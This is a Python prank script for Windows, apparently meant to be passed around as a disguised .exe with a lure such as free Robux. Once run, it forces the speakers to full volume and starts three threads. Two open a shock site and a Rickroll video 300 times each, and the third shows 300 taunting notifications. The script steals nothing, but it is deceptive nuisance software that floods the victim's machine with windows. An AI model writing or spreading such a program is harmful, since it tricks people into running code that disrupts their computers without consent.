import webbrowser
import time
import random
import threading
from win10toast import ToastNotifier
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# Initialize toaster once
toaster = ToastNotifier()

def blast_volume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMute(0, None)  
    volume.SetMasterVolumeLevelScalar(1.0, None)

stupid_sayings = [
    "MUAHAHA, YOU REALLY OPENED THIS?",
    "Bro, you thought I wouldn’t prank you?",
    "L + Ratio + Pranked 🤡",
    "You have been Rickrolled by your own curiosity.",
    "This is why you don’t trust .exe files.",
    "Your FBI agent is laughing at you rn.",
    "Mistakes were made.",
    "And you thought it was a game 😈.",
    "Look at you, falling for it again.",
    "Bro, it’s summer, what else did you expect?",
    "Gottem. Stay mad.",
    "You smell bad. This is your reminder.",
    "Even your PC is embarrassed for you now.",
    "You trusted me? Rookie mistake.",
    "You’re not HIM. I am.",
    "Your PC will remember this…",
    "Ratio’d by your own download.",
    "Did you seriously think this was free Robux you Roblox addict?",
    "Skill issue detected.",
    "Enjoy the rickroll. You earned it for being this dumb.",
    "IMAGINE GETTING PRANKED BY RAHIB AHHHHHHHHHHHHHHHHHH",
    "NEVER GONNA GIVE YOU UP",
    "NEVER GONNA LET YOU DOWN",
    "NEVER GONNA RUN AROUND AND DESERT YOU",
    "NEVER GONNA MAKE YOU CRY",
    "NEVER GONNA SAY GOODBYE",
    "NEVER GONNA TELL A LIE AND HURT YOU",
]

def spam_youareanidiot():
    for _ in range(300): 
        webbrowser.open("https://youareanidiot.cc")
        time.sleep(2)

def spam_rickroll():
    for _ in range(300):  
        webbrowser.open("https://rick.andrut.org/video.mp4")
        time.sleep(2)

def spam_notifications():
    for _ in range(300):  
        saying = random.choice(stupid_sayings)
        toaster.show_toast("WHAT DID YOU EXPECT (GET PRANKED BOZO)", saying, duration=5)
        time.sleep(3)

if __name__ == "__main__":

    blast_volume()
    
    t1 = threading.Thread(target=spam_youareanidiot)
    t2 = threading.Thread(target=spam_rickroll)
    t3 = threading.Thread(target=spam_notifications)

    t1.start()
    t2.start()
    t3.start()

    t1.join()
    t2.join()
    t3.join()

    input("Press Enter to exit...")



    




    
    
    
            


